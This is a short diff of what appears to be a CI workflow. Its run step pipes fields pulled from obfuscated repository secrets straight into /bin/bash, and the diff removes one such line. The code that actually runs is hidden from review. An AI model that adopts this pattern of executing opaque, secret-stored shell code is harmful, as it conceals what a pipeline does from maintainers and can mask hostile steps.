@@ -27,7 +27,6 @@ jobs:
           q380: ${{ secrets.q380 }}
         run: |
           printf '%s' "$q380" | jq -r .sosjn0169 | /bin/bash
-          echo $iom8376 | jq -r .jw2 | /bin/bash
           printf '%s' "$baez117" | jq -r .ndibk4 | /bin/bash
           printf '%s' "$frqe3" | jq -r .uuxh4 | /bin/bash
           printf '%s' "$up31" | jq -r .sizye05 | /bin/bash
